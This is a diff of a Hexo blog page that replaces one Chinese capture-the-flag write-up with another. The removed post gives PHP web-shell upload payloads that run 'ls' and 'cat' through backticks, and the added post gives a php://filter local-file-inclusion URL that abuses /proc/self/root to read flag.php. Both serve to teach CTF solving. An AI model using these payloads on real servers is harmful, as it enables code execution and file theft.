@@ -4,17 +4,17 @@
   <meta charset="utf-8">
   
   
-  <title>[红明谷CTF 2021]write_shell | Hexo</title>
+  <title>[WMCTF2020]Make PHP Great Again | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="打开靶机，看到一段代码。&lt;?phperror_reporting(0);highlight_file(FILE);function check($input){    if(preg_match(“&#x2F;‘| ||php|;|~|\^|\+|eval|{|}&#x2F;i”,$input)){        &#x2F;&#x2F; if(preg_match(“&#x2F;‘| ||">
+  <meta name="description" content="打开后看到一小段代码&lt;?phphighlight_file(FILE);require_once ‘flag.php’;if(isset($_GET[‘file’])) {  require_once $_GET[‘file’];} 这里出现了require_oncerequire_once 表达式和 require 表达式完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则">
 <meta property="og:type" content="article">
-<meta property="og:title" content="[红明谷CTF 2021]write_shell">
-<meta property="og:url" content="http://example.com/2025/02/09/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell/index.html">
+<meta property="og:title" content="[WMCTF2020]Make PHP Great Again">
+<meta property="og:url" content="http://example.com/2025/02/09/WMCTF2020-Make-PHP-Great-Again/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="打开靶机，看到一段代码。&lt;?phperror_reporting(0);highlight_file(FILE);function check($input){    if(preg_match(“&#x2F;‘| ||php|;|~|\^|\+|eval|{|}&#x2F;i”,$input)){        &#x2F;&#x2F; if(preg_match(“&#x2F;‘| ||">
+<meta property="og:description" content="打开后看到一小段代码&lt;?phphighlight_file(FILE);require_once ‘flag.php’;if(isset($_GET[‘file’])) {  require_once $_GET[‘file’];} 这里出现了require_oncerequire_once 表达式和 require 表达式完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2025-02-09T12:29:13.000Z">
-<meta property="article:modified_time" content="2025-02-09T12:44:35.738Z">
+<meta property="article:published_time" content="2025-02-09T12:53:34.000Z">
+<meta property="article:modified_time" content="2025-02-09T13:01:20.492Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -71,10 +71,10 @@
 </header>
 
       <div class="outer">
-        <section id="main"><article id="post-红明谷CTF-2021-write-shell" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+        <section id="main"><article id="post-WMCTF2020-Make-PHP-Great-Again" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2025/02/09/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell/" class="article-date">
-  <time class="dt-published" datetime="2025-02-09T12:29:13.000Z" itemprop="datePublished">2025-02-09</time>
+    <a href="/2025/02/09/WMCTF2020-Make-PHP-Great-Again/" class="article-date">
+  <time class="dt-published" datetime="2025-02-09T12:53:34.000Z" itemprop="datePublished">2025-02-09</time>
 </a>
     
   </div>
@@ -85,7 +85,7 @@
         
   
     <h1 class="p-name article-title" itemprop="headline name">
-      [红明谷CTF 2021]write_shell
+      [WMCTF2020]Make PHP Great Again
     </h1>
   
 
@@ -93,16 +93,17 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>打开靶机，看到一段代码。<br>&lt;?php<br>error_reporting(0);<br>highlight_file(<strong>FILE</strong>);<br>function check($input){<br>    if(preg_match(“&#x2F;‘| |<em>|php|;|~|\^|\+|eval|{|}&#x2F;i”,$input)){<br>        &#x2F;&#x2F; if(preg_match(“&#x2F;‘| |</em>|&#x3D;|php&#x2F;“,$input)){<br>        die(‘hacker!!!’);<br>    }else{<br>        return $input;<br>    }<br>}</p>
-<p>function waf($input){<br>  if(is_array($input)){<br>      foreach($input as $key&#x3D;&gt;$output){<br>          $input[$key] &#x3D; waf($output);<br>      }<br>  }else{<br>      $input &#x3D; check($input);<br>  }<br>}</p>
-<p>$dir &#x3D; ‘sandbox&#x2F;‘ . md5($_SERVER[‘REMOTE_ADDR’]) . ‘&#x2F;‘;<br>if(!file_exists($dir)){<br>    mkdir($dir);<br>}<br>switch($_GET[“action”] ?? “”) {<br>    case ‘pwd’:<br>        echo $dir;<br>        break;<br>    case ‘upload’:<br>        $data &#x3D; $_GET[“data”] ?? “”;<br>        waf($data);<br>        file_put_contents(“$dir” . “index.php”, $data);<br>}<br>?&gt;<br>先用?action&#x3D;pwd查看目录，记下访问该目录，访问该目录下index.php就是我们即将写入代码的目标文件<br>再讲讲写入，过滤的几个关键就是空格,php,; 一个一个来<br>空格过滤能用%09或\t来绕过，这两个符号都代表制表符，也就是平常使用的Tab键，四个空格<br>php主要针对php格式，换成<?= ?>就行了<br>至于;其实不用考虑 ?&gt;会自动对最后一行起到;的作用<br>提一嘴php中括起来的内容被认为是代码<br>构建payload:</p>
-<p>?action&#x3D;upload&amp;data&#x3D;<?=`ls\t/`?>&#96;<br>在根目录里找到了flag,最终payload:</p>
-<p>?action&#x3D;upload&amp;data&#x3D;<?=`cat\t/flllllll1112222222lag`?><br>便可得到flag{b868d874-2c12-4d6d-b3ce-ab450028e066} </p>
+        <p>打开后看到一小段代码<br>&lt;?php<br>highlight_file(<strong>FILE</strong>);<br>require_once ‘flag.php’;<br>if(isset($_GET[‘file’])) {<br>  require_once $_GET[‘file’];<br>}</p>
+<p>这里出现了require_once<br>require_once 表达式和 require 表达式完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含。</p>
+<p>由于 require_once 包含的软链接层数较多时 once 的 hash 匹配会直接失效造成重复包含。</p>
+<p>由于已经包含过一次了，接下来就是绕过once再包含一次</p>
+<p>&#x2F;proc&#x2F;self&#x2F;是指向当前进程的&#x2F;proc&#x2F;pid&#x2F;，而&#x2F;proc&#x2F;self&#x2F;root是指向&#x2F;的软连接，所以让软连接层数变多即可造成重复包含：<br>&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p>
+<p>在url中输入便得到PD9waHAKCiRmbGFnID0gJ2ZsYWd7NjVkZDVhOTEtYzhlZC00Y2JiLWJhNjgtMGM3ODVjZTE1YTdhfSc7Cg&#x3D;&#x3D;<br>解码便可得到flag。</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/02/09/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell/" data-id="cm6xm9k5m0000csx1eb4o0fcz" data-title="[红明谷CTF 2021]write_shell" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/02/09/WMCTF2020-Make-PHP-Great-Again/" data-id="cm6xmv56t0000qcx17a6p1jfm" data-title="[WMCTF2020]Make PHP Great Again" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -112,19 +113,10 @@
     
 <nav id="article-nav">
   
-    <a href="/2025/02/09/WMCTF2020-Make-PHP-Great-Again/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          [WMCTF2020]Make PHP Great Again
-        
-      </div>
-    </a>
   
-  
-    <a href="/2025/02/07/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2025/02/09/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">报错注入</div>
+      <div class="article-nav-title">[红明谷CTF 2021]write_shell</div>
     </a>
   
 </nav>
